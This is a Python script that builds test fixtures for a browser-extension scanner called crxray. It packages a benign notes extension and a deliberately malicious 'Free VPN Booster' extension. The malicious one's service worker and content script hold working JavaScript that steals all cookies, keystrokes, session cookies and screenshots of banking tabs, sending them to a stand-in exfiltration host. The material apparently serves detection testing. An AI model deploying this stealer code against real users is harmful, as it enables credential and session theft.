#!/usr/bin/env python3
"""Build benign + malicious test extensions, package as CRX3 with crxray's own writer."""
import io, json, os, sys, zipfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from crxray import build_crx3, crx_id_from_pubkey, crx_id_to_string

HERE = os.path.dirname(os.path.abspath(__file__))

BENIGN = {
    "manifest.json": {
        "manifest_version": 3,
        "name": "Quick Notes",
        "version": "1.0",
        "description": "A tiny notes popup. Totally innocent.",
        "permissions": ["storage"],
        "action": {"default_popup": "popup.html"},
        "content_scripts": [{
            "matches": ["https://example.com/*"],
            "js": ["content.js"],
        }],
    },
    "popup.html": "<html><body><h1>notes</h1></body></html>",
    "content.js": "// highlight helper for example.com\nconsole.log('notes ready');",
}

EVIL = {
    "manifest.json": {
        "manifest_version": 3,
        "name": "Free VPN Booster",
        "version": "2.1",
        "description": "Speed up your browsing! (definitely not malware)",
        "permissions": ["cookies", "webRequest", "scripting", "storage", "tabs"],
        "host_permissions": ["<all_urls>"],
        "background": {"service_worker": "sw.js"},
        "content_scripts": [{
            "matches": ["<all_urls>"],
            "js": ["kl.js"],
            "all_frames": True,
            "run_at": "document_start",
        }],
        "update_url": "https://updates.totally-legit-vpn.example/update.xml",
    },
    "sw.js": """
// "telemetry"
chrome.cookies.getAll({}, (cookies) => {
  fetch("https://exfil.totally-legit-vpn.example/collect", {
    method: "POST",
    body: JSON.stringify(cookies.map(c => c.name + "=" + c.value))
  });
});
chrome.webRequest.onBeforeRequest.addListener(
  (d) => { /* inspect banking traffic */ },
  {urls: ["<all_urls>"]}, ["blocking"]
);
chrome.tabs.onUpdated.addListener((id, info, tab) => {
  if (tab.url.includes("bank")) { chrome.tabs.captureVisibleTab((img) => { leak(img); }); }
});
function leak(img){ fetch("https://exfil.totally-legit-vpn.example/img",{method:"POST",body:img}); }
""",
    "kl.js": """
document.addEventListener('keydown', (e) => {
  navigator.sendBeacon("https://exfil.totally-legit-vpn.example/keys", e.key);
});
const sess = document.cookie; // grab session
fetch("https://exfil.totally-legit-vpn.example/c", {method:"POST", body: sess});
""",
}


def make_zip(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, content in files.items():
            data = json.dumps(content, indent=2).encode() if name.endswith(".json") else content.encode()
            z.writestr(name, data)
    return buf.getvalue()


def main():
    with open(os.path.join(HERE, "testkey_pub.der"), "rb") as f:
        pubkey = f.read()
    print("test key crx id:", crx_id_to_string(crx_id_from_pubkey(pubkey)))
    for label, files in (("benign", BENIGN), ("evil", EVIL)):
        blob = make_zip(files)
        crx = build_crx3(pubkey, blob)
        out = os.path.join(HERE, f"fixtures/{label}.crx")
        with open(out, "wb") as f:
            f.write(crx)
        print(f"wrote {out} ({len(crx)} bytes)")


if __name__ == "__main__":
    main()
